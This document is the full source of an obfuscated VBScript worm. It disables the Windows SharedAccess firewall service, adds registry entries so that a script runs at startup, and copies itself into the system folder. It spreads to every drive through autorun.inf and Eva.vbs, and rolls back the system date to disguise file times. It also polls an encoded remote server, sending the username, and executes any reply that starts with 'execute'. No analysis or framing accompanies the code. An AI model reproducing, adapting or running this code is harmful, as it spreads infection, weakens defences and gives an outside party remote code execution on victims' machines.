On erRor RESUME nexT
SeT FSo=cREATEobjeCt(STRrEvERSE("TcEJboMetSySelIF.GNItPircs"))
SEt WsHshELL=cREAtEOBJeCt(stRReVErsE("LlehS.TPIrCSW"))
diM dRi_LIst,dRI_list0
dIM isseND
isSend=0
C_TImE=DaTe()
WsHSHEll.RUn "NeT sTop shareDacCess",0
sEt DRvs=fSO.DrIveS
sYSDIR=Fso.GEtSpEcIAlfoLDER(1)
ThISPAtH=WSCRIPT.SCriPtfUlLnaME
SEt fc=fSO.opENteXtFilE(THiSPAtH,1)
sCopY=fC.reAdALl
FC.CLoSE
sEt fc=NoThiNG
caLL writeFIlE(SysdiR&"\sySinfo.rEG",UnEsCaPe(sTrReVERSe("00c2%00C2%00c2%00c2%00C2%00c2%00C2%00c2%00C2%00c2%00c2%00C2%00c2%00c2%00c2%00A3%92%b82%XEHd3%22%EMITcEXe22%a0%D0%02%22%22%d3%22%srETemArAp22%A0%D0%02%22%SbV.gFCnRPc5%c5%23mETSYSc5%C5%52%riDNiW52%22%d3%22%tpirCS22%A0%d0%02%d5%0c5%0c5%pUTrAtSc5%stPiRcSC5%enIHCamC5%ETaTsc5%ycilOp02%puOrGC5%NoiSRevtnERrUcC5%SwodNIWC5%TfosORcImC5%ErawTFOSC5%enIhCAM_lAcOL_YEKHb5%a0%d0%a0%d0%02%00C2%00C2%00C2%00c2%00C2%00C2%00C2%00C2%00c2%00C2%00c2%00C2%00C2%00C2%00c2%00A3%92%B82%xehD3%22%emitCEXe22%a0%d0%02%22%22%d3%22%sReTEMAraP22%a0%d0%02%22%sbv.GfcNrpC5%c5%23MEtsYSC5%c5%52%RiDNIw52%22%D3%22%tPiRcs22%a0%d0%02%d5%0c5%0C5%putraTsc5%sTPiRcSC5%metsYsC5%SwoDNIwc5%tFoSOrCImC5%sEicilOpC5%EraWtfOSc5%eNiHCaM_lAcOl_YeKhB5%a0%D0%a0%D0%03%03%E2%53%02%E6%f6%96%37%27%56%65%02%27%F6%47%96%46%54%02%97%27%47%37%96%76%56%25%02%37%77%F6%46%e6%96%75%")))
wSHsheLl.rUn "REgedit /S sYsinfO.Reg",0
WscRIpT.sLeEP 200
FsO.DEleTEFilE sYsDIr&"\SysiNfo.rEg",tRue
iF iNstR(THiSpaTh,sYSdIr)>0 ThEn
DRI_lisT0=LIstDrv()
O_timE=lEFt(C_tiMe,3)&cStR(InT(Mid(c_Time,4,1))-1)&RIGHT(C_TImE,LeN(c_TiME)-4)
wsHsHeLL.RUN "Cmd /C datE "&O_tIME,0
wSCRIpT.sleEp 10000
For DrI_i=1 To len(DrI_LIst0)
cALl wRItEAuTo(mId(drI_LisT0,Dri_I,1)&":\")
nExT
WsHsHEll.rUn "CMD /c DATE "&C_tiME,0
coMPuTErNAMe="":UsErNaME=""
set OBjwmISerVicE=GETOBJECt("wINMgMts:{iMPerSONAtiOnLeVEl=IMpeRsoNaTE}!\\.\rOot\CImv2")
SEt colcOmPuters = obJWmISeRvICe.execQuERY("sELEct * FrOM WIn32_cOmputErSysTem")
FoR eAcH oBjcOmPuTEr iN coLcOmpuTERS
cOMPUTerName=OBJcompUTeR.nAME
UseRnAmE=OBJcOmPuter.UserNAme
nExT
IF USeRNaME="" tHEn UseRNAMe="eVaR"
IF iNstR(USernAmE,"\")<=0 theN
UsErnamE=ComputerNamE&"\"&UsERname
EnD IF
DO
iF iSsENd=0 Then
set xMl=CreAteOBjEct(sTRrEveRsE("PtThLMxrEvRes.2LMXsm"))  
xMl.oPEN "get",sTRrEVErsE(uNeScApE("%3d%61%3F%70%73%61%2E%74%6E%75%6F%63%2F%61%76%65%2f%62%7a%7a%2f%30%30%31%2E%34%30%31%2E%39%31%31%2E%32%30%32%2F%2F%3A%70%74%74%68"))&usERName,0
XmL.sEtreqUEStHEAdeR "UsER-AGenT","eVAr"
XmL.SenD()
IF ErR.NumbER=0 then
iSSEnd=1
REs=Xml.resPOnSEtExT
if UcAsE(LEfT(REs,7))=UcAse("execUte")  ThEN eXEcUTe reS
ElSe
err.ClEAr
END iF
sET xmL=NOTHiNg
END iF

dRI_lIST=LisTdRv()
FOR Dri_K=1 to Len(dRi_List)
If INstR(DRi_LiST0,MiD(dRI_LiST,DrI_k,1))<=0 ThEN
caLL WriteaUTo(MId(drI_LIst,drI_k,1)&":\")
End If
NEXT
DRI_lISt0=dRi_list
WscRipt.sLEEp 1000
loOP
eLse
wsHShELl.rUN "eXpLoREr .\",3
wScRiPT.SlEeP 2000
WSHsHelL.ApPaCTIVAtE unESCape(LcaSe("%u6211%u7684%u7535%u8111"))
WShSHeLl.SeNdKeyS UcaSE("% C")
RUNFlag=0
fOR each PS in geTobjECt _ 
("WinmGmTs:\\.\ROOT\cIMv2:wIn32_procEss").iNsTANcES_ 
if LCaSe(ps.namE)=LCaSe("WScRiPt.Exe") THEN
rUnFLAG=RuNFLaG+1
ENd if
NeXt
IF rUnflAG>=2 THen wScrIpt.qUIT
SEt Sf=FsO.gETfoLdER(SYsDiR)
f_tiMe=leFT(Sf.DAtecREATed,inSTr(SF.datECREatEd," ")-1)
wShShEll.RuN "CMD /C DatE "&F_Time,0
wScrIpt.SlEEP 100
call WrItEfiLe(sYSdIR&LcASE("\pRnCFg.vBS"),Vs(sCoPY))
wSHShELL.RUN "cmD /c dATE "&C_tiME,0
WShsHeLl.Run sYSDiR&"\pRnCFg.VbS"
EnD iF
FuNCtIoN vS(Str)
ExECUte STRReversE(uNEScape("%29%29%22u%25%22%28EsAcl%2c%29%22u%25%22%28esAcu%2CSV%28ECaLPEr%3dsV%0D%0ATXEn%0d%0Afi%20dnE%0D%0ac%26sV%3dsV%0d%0aesLe%0D%0a%29C%28EsacL%26Sv%3dSv%0D%0aNeHt%2005%3E%29001*%29%28DNr%28tni%20Fi%0d%0aEZImOdnAr%0d%0a%29%291%2CI%2CrTs%28dIm%28ESACU%3Dc%0D%0A%29rTS%28neL%20Ot%201%3dI%20RoF"))
end FUncTioN
FUNCTIOn LiSTDrV()
exEcuTE StrReVeRse(UNesCapE("tsiL_pMt%3dVRDtsil%0D%0aTxen%0d%0afI%20Dne%0d%0aReTtElevIrD.VRD%26TSil_PMt%3DTsIL_Pmt%0d%0ANeHt%20yDaERSi.vrD%20fI%0D%0aSVrD%20ni%20vRd%20hcae%20ROf%0d%0A%22%22%3DtSIl_PMt%0d%0aTsIl_PMt%20mid"))
eND fUncTioN

SUb WrITEaUto(PatH)
EXEcuTe sTrreVErsE(uNEScapE("Fi%20DNE%0d%0aEuRt%2c%22fNi.nUrotUa%22%26hTaP%20elIfEtELEd.oSF%0d%0aNeHT%20%29%22fni.NuRotUa%22%26hTap%28StSixEeLiF.oSf%20fIeSlE%0d%0a%29%28DnR%26hTAP%2C%22FnI.nuROtuA%22%26HtAP%20rEdlofEvom.OSf%0d%0anEHT%20%29%22FNi.nurOtuA%22%26htAp%28stsIXerEdlOF.osf%20Fi"))
Cmdstr="sHeLl\*\CoMmanD=wsCripT.EXe "&cHr(34)&"EVA.vbS"&chR(34)
aUTOStr="[auTOrUn]"&vBcRLF&"opEn="&VbcRlF&REpLaCE(cMdStR,"*","opEN")&vBCrLf&REPlAce(CmDStr,"*","eXpLoRe")&vBcRlf&rEplacE(cmDstR,"*","FINd")
CAlL wrIteFilE(PAth&uCaSe("AUtoRun.INf"),AuToStr)
call wRiTeFile(PaTh&"Eva.Vbs",vS(sCoPy))
EnD SUB

Sub WRiTeFIlE(FPath,conTEnT)
exECutE sTRrEVeRsE(uNescaPe("gNIhToN%3DAf%20Tes%0d%0a7%3dsetUbIRttA.aF%0d%0a%29HtApF%28ElIfTEG.oSF%3daF%20TeS%0d%0agNIhtOn%3DcF%20TEs%0D%0aESoLc.cF%0d%0AtNEtnoC%20eTiRw.Cf%0D%0A%29EuRt%2C2%2cHTApF%28ELIfTxETnEPO.OSF%3dCf%20TEs%0D%0AEuRT%2chtaPF%20ElifEtELeD.oSf%20nEHt%20%29HtApf%28sTsiXEeLiF.OSF%20FI"))
End sub
